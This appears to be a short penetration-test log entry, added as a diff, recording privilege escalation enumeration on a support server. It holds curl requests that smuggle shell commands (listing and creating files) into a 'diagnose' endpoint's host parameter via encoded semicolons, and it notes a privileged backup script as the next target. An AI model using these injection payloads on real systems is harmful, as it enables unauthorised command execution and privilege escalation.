@@ -1,0 +1,23 @@
+Phase:
+Privilege Escalation Enumeration
+
+Activity:
+Backup Mechanism Assessment
+
+Date:
+2026-07-30
+
+Commands:
+
+sudo cat /usr/local/sbin/support-backup
+curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Bls%20-la%20/srv/support/uploads"
+curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Btouch%20/srv/support/uploads/demo-file"
+curl "http://127.0.0.1:8080/diagnose?host=127.0.0.1%3Bls%20-la%20/srv/support/uploads"
+
+Purpose:
+
+Verified the privileged backup script, confirmed that the application account can create files in the uploads directory, and identified the backup process as the next assessment target.
+
+Status:
+
+Privilege escalation surface successfully identified and validated.
